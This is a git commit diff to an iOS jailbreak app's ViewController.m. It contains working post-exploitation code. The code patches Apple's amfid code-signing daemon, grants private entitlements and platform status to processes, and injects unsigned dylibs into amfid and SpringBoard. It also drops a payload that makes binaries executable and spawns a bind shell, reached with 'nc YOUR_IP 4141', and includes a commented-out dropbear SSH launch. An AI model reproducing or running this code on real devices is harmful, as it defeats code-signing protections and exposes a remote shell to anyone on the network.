e8730764ff8acc01ecdf7d02af215e22f76e426a
Jake James <jakeashacks@gmail.com>
2018-06-16 13:41:55 +0200

    im stupid

--- multi_path/ViewController.m
+++ multi_path/ViewController.m
@@ -158,46 +158,18 @@ next:
     kill(pid, SIGSTOP);
     kill(pid, SIGSTOP);
     
+    extern int platformizeProcAtAddr(uint64_t addr); //WHY ISN'T THIS ON QiLin.h???
+    
+    pid_t amfid = pid_for_name("amfid");
+    
     castrateAmfid(); //patch amfid
     
-    pid_t amfid = pid_for_name("amfid"), newam = amfid;
-    
+    platformizeProcAtAddr(proc_for_pid(amfid));
     entitlePid(amfid, "get-task-allow", true, "com.apple.private.skip-library-validation", true); //add required entitlements to load unsigned library
-    empower(amfid); //set csflags
+    empower(amfid);
     
-    NSString *pl = [NSString stringWithFormat:@"%@/amfid_payload.dylib", [[NSBundle mainBundle] bundlePath]];
-   
-    inject_dylib(amfid, (char*)[pl UTF8String]); //hope the signature gets cached and it works after killing amfid
-    inject_dylib(amfid, (char*)[pl UTF8String]);
-    inject_dylib(amfid, (char*)[pl UTF8String]);
-    
-    while (newam == amfid) {
-        printf("here\n");
-        kill(amfid, SIGSTOP); //kill amfid
-        kill(amfid, SIGSEGV);
-        kill(amfid, SIGKILL);
-        
-        NSString *testbin_ = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]]; //test binary
-        chmod([testbin_ UTF8String], 777); //give it proper permissions
-        
-        //trigger amfid
-        pid_t pd_;
-        const char* args_[] = {[testbin_ UTF8String],  NULL};
-        posix_spawn(&pd_, [testbin_ UTF8String], NULL, NULL, (char **)&args_, NULL);
-        posix_spawn(&pd_, [testbin_ UTF8String], NULL, NULL, (char **)&args_, NULL);
-        posix_spawn(&pd_, [testbin_ UTF8String], NULL, NULL, (char **)&args_, NULL);
-        
-        newam = pid_for_name("amfid"); //update pid
-    }
-    
-    if (newam != 0 && newam != amfid) {
-        printf("Relaunched amfid!\n"); //yay
-    }
-    
-    entitlePid(newam, "get-task-allow", true, "com.apple.private.skip-library-validation", true); //add required entitlements to load unsigned library
-    empower(newam); //set csflags
-    
-    inject_dylib(newam, (char*)[pl UTF8String]);
+    NSString *pl = [NSString stringWithFormat:@"%@/amfid_payload.dylib", [[NSBundle mainBundle] bundlePath]]; //any tweak NOT compiled with substrate works.
+    inject_dylib(amfid, (char*)[pl UTF8String]); //properly patch amfid
     
     NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]]; //test binary
     chmod([testbin UTF8String], 777); //give it proper permissions
@@ -227,13 +199,10 @@ next:
         
         entitlePid(sb, "get-task-allow", true, "com.apple.private.skip-library-validation", true); //add required entitlements to load unsigned library
         empower(sb); //set csflags
-        extern int platformizeProcAtAddr(uint64_t addr); //WHY ISN'T THIS ON QiLin.h???
         platformizeProcAtAddr(proc_for_pid(sb)); //why isn't SpringBoard already platform?
         
         NSString *cyc = [NSString stringWithFormat:@"%@/dylibs/dummypass.dylib", [[NSBundle mainBundle] bundlePath]]; //any tweak NOT compiled with substrate works.
-    
-        rv2 = inject_dylib(sb, [cyc UTF8String]);
-    
+        rv2 = inject_dylib(sb, (char*)[cyc UTF8String]);
     }
     
     if (![[self getIPAddress] isEqualToString:@"Are you connected to internet?"])
@@ -249,6 +218,15 @@ next:
         if (!rv)
             drop_payload(); //chmod 777 all binaries and spawn a shell
     });
+    
+   /* NSString *dropbear = [NSString stringWithFormat:@"%@/iosbinpack64/usr/local/bin/dropbear", [[NSBundle mainBundle] bundlePath]]; //test binary
+    NSString *bash = [NSString stringWithFormat:@"%@/iosbinpack64/bin/bash", [[NSBundle mainBundle] bundlePath]]; //test binary
+    
+    pid_t drop;
+    const char* dargs[] = {[dropbear UTF8String],  "-R", "--shell", [bash UTF8String], NULL};
+    rv = posix_spawn(&drop, [dropbear UTF8String], NULL, NULL, (char **)&dargs, NULL);
+    
+    if (!rv) [self log:@"Launched dropbear?"];*/
     
     //to connect use netcat:
     //nc YOUR_IP 4141
